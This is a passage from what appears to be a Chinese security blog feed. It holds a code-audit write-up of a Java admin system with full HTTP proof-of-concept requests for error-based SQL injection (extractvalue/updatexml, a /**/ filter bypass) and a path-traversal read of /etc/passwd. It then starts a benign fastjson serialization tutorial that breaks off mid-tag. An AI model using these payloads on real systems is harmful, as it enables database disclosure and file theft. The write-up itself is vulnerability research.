</span>JSESSIONID=6ea4c4cf-c715-4be1-8388-30b7dc810de9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-stylus">params<span class="hljs-selector-attr">[dataScope]</span>=and <span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-built_in">database</span>()),<span class="hljs-number">0</span>x7e))</span><br></code></pre></td></tr></table></figure><h3 id="3-5-查询已分配角色列表："><a href="#3-5-查询已分配角色列表：" class="headerlink" title="3.5 查询已分配角色列表："></a>3.5 查询已分配角色列表：</h3><p>路径为<code>/system/role/authUser/allocatedList</code></p><p>同理查询<code>$&#123;</code>，发现了<code>selectAllocatedList</code>这个方法存在可疑的sql注入点：</p><p><img src="/../../blog_image/image-20240307143553612.png" alt="image-20240307143553612"></p><p>追踪到controller层：</p><p><img src="/../../blog_image/image-20240307143659323.png" alt="image-20240307143659323"></p><p>前端点击：</p><p><img src="/../../blog_image/image-20240307143939865.png" alt="image-20240307143939865"></p><p>poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/role/authUser/allocatedList</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>166<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/role/authUser/1<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=6ea4c4cf-c715-4be1-8388-30b7dc810de9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-sas">pageSize=10<span class="hljs-variable">&amp;pageNum</span>=1<span class="hljs-variable">&amp;orderByColumn</span>=createTime<span class="hljs-variable">&amp;isAsc</span>=desc<span class="hljs-variable">&amp;roleId</span>=1<span class="hljs-variable">&amp;loginName</span>=<span class="hljs-variable">&amp;phonenumber</span>=<span class="hljs-variable">&amp;params</span>[dataScope]=<span class="hljs-keyword">and</span> extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> database()),0x7e))</span><br></code></pre></td></tr></table></figure><p>也可以使用</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&amp;params<span class="hljs-selector-attr">[dataScope]</span>=<span class="hljs-built_in">and</span>(select <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(SELECT <span class="hljs-built_in">database</span>())),<span class="hljs-number">0</span>x7e))<br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20240307145020776.png" alt="image-20240307145020776"></p><h3 id="3-6-查询未分类角色列表："><a href="#3-6-查询未分类角色列表：" class="headerlink" title="3.6 查询未分类角色列表："></a>3.6 查询未分类角色列表：</h3><p>查询接口：<code>/system/role/authUser/unallocatedList</code></p><p><img src="/../../blog_image/image-20240307145418345.png" alt="image-20240307145418345"></p><p>poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/role/authUser/unallocatedList</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>173<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/role/authUser/selectUser/100<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=6ea4c4cf-c715-4be1-8388-30b7dc810de9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-sas">pageSize=10<span class="hljs-variable">&amp;pageNum</span>=1<span class="hljs-variable">&amp;orderByColumn</span>=createTime<span class="hljs-variable">&amp;isAsc</span>=desc<span class="hljs-variable">&amp;roleId</span>=100<span class="hljs-variable">&amp;loginName</span>=<span class="hljs-variable">&amp;phonenumber</span>=<span class="hljs-variable">&amp;params</span>[dataScope]=<span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> updatexml(1,concat(0x7e,(<span class="hljs-keyword">SELECT</span> database())),0x7e))</span><br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20240307150734573.png" alt="image-20240307150734573"></p><h3 id="3-7-查询部门列表："><a href="#3-7-查询部门列表：" class="headerlink" title="3.7 查询部门列表："></a>3.7 查询部门列表：</h3><p>请求路径为：<code>/system/dept/list</code></p><p><img src="/../../blog_image/image-20240307152149553.png" alt="image-20240307152149553"></p><p>dept对象是可控的，因此可以直接梭哈：</p><p><img src="/../../blog_image/image-20240307152217690.png" alt="image-20240307152217690"></p><p>注入点一样params[dataScope]，还可以使用updatexml进行注入。poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/dept/list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>101<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;110&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/dept<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=6ea4c4cf-c715-4be1-8388-30b7dc810de9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-stylus">deptName=<span class="hljs-number">123</span>&amp;status=&amp;params<span class="hljs-selector-attr">[dataScope]</span>=<span class="hljs-built_in">and</span>(select <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(SELECT <span class="hljs-built_in">database</span>())),<span class="hljs-number">0</span>x7e))</span><br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20240307152453369.png" alt="image-20240307152453369"></p><h3 id="3-8-修改部门状态："><a href="#3-8-修改部门状态：" class="headerlink" title="3.8 修改部门状态："></a>3.8 修改部门状态：</h3><p>请求路径为：<code>/system/dept/edit</code></p><p><img src="/../../blog_image/image-20240307152759836.png" alt="image-20240307152759836"></p><p>注入点为<code>dept_id</code>。</p><p>controller层接口如图所示：</p><p><img src="/../../blog_image/image-20240307152925916.png" alt="image-20240307152925916"></p><p>这个dept是从前端过来，并且是可控的，但是调用流程有点多，存在多个循环。</p><p><img src="/../../blog_image/image-20240307153058194.png" alt="image-20240307153058194"></p><p>这个的注入点是<code>ancestors</code>，前端传入的string类型，这里根据string字符串根据<code>,</code>进行切割。因此可以构造成：</p><p><code>0)or(extractvalue(1,concat((select user()))));#</code></p><p>不知道为什么使用select version会显示不全。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/dept/edit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>113<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/system/dept/edit/101<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=721a661a-97f4-44bf-acaa-3f1e43c0b313<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-apache"><span class="hljs-attribute">DeptName</span>=<span class="hljs-number">1</span>&amp;DeptId=<span class="hljs-number">100</span>&amp;ParentId=<span class="hljs-number">12</span>&amp;Status=<span class="hljs-number">0</span>&amp;OrderNum=<span class="hljs-number">1</span>&amp;ancestors=<span class="hljs-number">0</span>)or(extractvalue(<span class="hljs-number">1</span>,concat((select user()))));#</span><br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20240309101125037.png" alt="image-20240309101125037"></p><h3 id="3-9-生成表-版本4-7-5："><a href="#3-9-生成表-版本4-7-5：" class="headerlink" title="3.9 生成表 版本4.7.5："></a>3.9 生成表 版本4.7.5：</h3><p>存在硬编码：</p><p><img src="/../../blog_image/image-20240309112838718.png" alt="image-20240309112838718"></p><p>service层：</p><p><img src="/../../blog_image/image-20240309112905611.png" alt="image-20240309112905611"></p><p>controller层：</p><p>路径为<code>/tool/gen/createTable</code></p><p><img src="/../../blog_image/image-20240309112935099.png" alt="image-20240309112935099"></p><p>首先会判断当前sql是否存在sql注入：</p><p><img src="/../../blog_image/image-20240309113029589.png" alt="image-20240309113029589"></p><p>根据这个<code>SQL_REGEX</code>以<code>|</code>分割获取所有的关键字</p><p>然后调用stringutils的方法，这个方法是获取当前第二个参数在第一个参数中匹配到的字符串的第一个下标，如<code>abcd b</code>，匹配到了b所以返回第一个b字符串的下标<code>1</code>。</p><p><img src="/../../blog_image/image-20240309113248298.png" alt="image-20240309113248298"></p><p>所以当这个匹配到则返回的结果是大于-1，则表明存在sql注入。</p><p>根据切片获取到的sqlkeywords的list集合是<img src="/../../blog_image/image-20240309135446759.png" alt="image-20240309135446759"></p><p>因此可以使用<code>select/**/</code>这样去绕过空格检测。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/tool/gen/createTable</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>iframe<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=8b84098e-2440-457e-9770-2f51a5afe81e<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>142<br><br><span class="language-pgsql"><span class="hljs-keyword">sql</span>=<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">table</span><span class="hljs-comment">/**/</span>sad<span class="hljs-comment">/**/</span><span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>version()),<span class="hljs-number">0x7e</span>));</span><br></code></pre></td></tr></table></figure><p><img src="/../../blog_image/image-20240309115001668.png" alt="image-20240309115001668"></p><h3 id="3-10-组合拳-定时任务-sql注入-rce："><a href="#3-10-组合拳-定时任务-sql注入-rce：" class="headerlink" title="3.10 组合拳 定时任务+sql注入 rce："></a>3.10 组合拳 定时任务+sql注入 rce：</h3><h2 id="4-任意文件读取："><a href="#4-任意文件读取：" class="headerlink" title="4. 任意文件读取："></a>4. 任意文件读取：</h2><p>版本小于<code>4.5.1</code></p><p>路径为：<code>/common/download/resource?resource=/profile/../../../../etc/passwd</code></p><p><img src="/../../blog_image/image-20240309111346024.png" alt="image-20240309111346024"></p><p>处理逻辑主要获取到最后一个<code>profile</code>然后截取后面的路径进行拼接。</p><p>本地资源这个方法不存在校验文件是否合法，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/common/download/resource?resource=/profile/../../../</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>iframe<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1/index<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=53976028-ac1b-48fd-840e-ddf217174015<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>可以实现读取任意文件。</p><p><img src="/../../blog_image/image-20240309111451591.png" alt="image-20240309111451591"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson 反序列化基础一(1.2.24)</title>
    <link href="/2024/04/21/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/fastjson/fastjson-1224/"/>
    <url>/2024/04/21/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/fastjson/fastjson-1224/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-基本使用："><a href="#0x01-基本使用：" class="headerlink" title="0x01 基本使用："></a>0x01 基本使用：</h1><p>编写一个实体类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hme.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h2><p>使用<code>JSON.toJSONString(student)</code>这个方法，可以返回一个json字符串。</p><p>如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-number">23</span>,<span class="hljs-string">&quot;张三&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(student);<br>    System.out.println(jsonString);<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/../../../blog_image/image-20240408101152021.png" alt="image-20240408101152021"></p><p>添加了<code>SerializerFeature.WriteClassName</code>后再次输出，就会多了<code>@type</code>。</p><p><img src="/../../../blog_image/image-20240408101210841.png" alt="image-20240408101210841"></p><h2 id="反序列化："><a href="#反序列化：" class="headerlink" title="反序列化："></a>反序列化：</h2><p>反序列化主要是<code>parse</code>和<code>parseObject</code>这两个方法。</p><h3 id="parse方法："><a href="#parse方法：" class="headerlink" title="parse方法："></a>parse方法：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.hme.entity.Student\&quot;,\&quot;age\&quot;:23,\&quot;name\&quot;:\&quot;张三\&quot;&#125;&quot;</span>;<br>System.out.println(<span class="hljs-string">&quot;========================&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;反序列化一：&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(str);<br>System.out.println(parse);<br></code></pre></td></tr></table></figure><p>使用<code>@type</code>指定类型，然后使用<code>parse</code>进行反序列化，结果会输出：</p><p><img src="/../../../blog_image/image-20240408101235242.png" 